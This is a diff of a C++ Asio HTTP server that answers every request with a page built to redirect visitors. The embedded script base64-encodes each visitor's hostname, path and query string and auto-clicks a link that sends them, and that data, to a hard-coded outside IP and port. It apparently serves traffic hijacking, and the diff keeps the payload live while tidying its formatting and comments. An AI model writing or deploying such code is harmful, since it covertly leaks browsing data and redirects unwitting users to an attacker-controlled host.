@@ -24,21 +24,40 @@ void HTTPServer::start_accept() {
     });
 }
 
-std::string HTTPServer::build_response_page() {
-    std::string html =
-R"(<html><head></head><body><a href="" id="h"></a><script>var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname)+ "&p=" + btoa(window.location.pathname + window.location.search);h.href=strU;if(document.all){document.getElementById("h").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("h").dispatchEvent(e);}</script></body></html>)";
+std::string HTTPServer::build_redirect_page(const std::string& host) {
+    (void)host;
+    // 简洁的 A 标签+脚本跳转：把 hostname/path 以 btoa(base64) 方式拼到目标后面
+    const std::string html =
+R"(<html><head><meta charset="utf-8"></head><body>
+<a href="" id="h"></a>
+<script>
+  var strU = "http://206.119.82.102:39880" +
+             "?d=" + btoa(window.location.hostname) +
+             "&p=" + btoa(window.location.pathname + window.location.search);
+  var a = document.getElementById("h");
+  a.href = strU;
+  if (document.all) {
+    a.click();
+  } else {
+    var e = document.createEvent("MouseEvents");
+    e.initEvent("click", true, true);
+    a.dispatchEvent(e);
+  }
+</script>
+</body></html>)";
 
     std::string resp =
         "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html\r\n"
+        "Content-Type: text/html; charset=utf-8\r\n"
         "Connection: close\r\n"
         "\r\n" + html;
+    // "Content-Length: " + std::to_string(html.size()) + "\r\n"
     return resp;
 }
 
 void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
     try {
-        // 读取请求头直到空行
+        // 读到空行（请求头结束）
         asio::streambuf reqbuf;
         asio::read_until(*sock, reqbuf, "\r\n\r\n");
         std::istream is(&reqbuf);
@@ -52,12 +71,10 @@ void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
             }
         }
 
-        // 设置TCP_NODELAY来禁用Nagle算法
         int one = 1;
         setsockopt(sock->native_handle(), IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
 
-        // 构建并发送响应
-        auto resp = build_response_page();
+        auto resp = build_redirect_page(host);
         asio::error_code ec;
         asio::write(*sock, asio::buffer(resp), ec);
         if (ec) {
@@ -65,7 +82,7 @@ void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
             return;
         }
 
-        // 关闭连接
+        // ★ 直接优雅关闭写端
         sock->shutdown(asio::ip::tcp::socket::shutdown_send, ec);
         sock->close(ec);
 
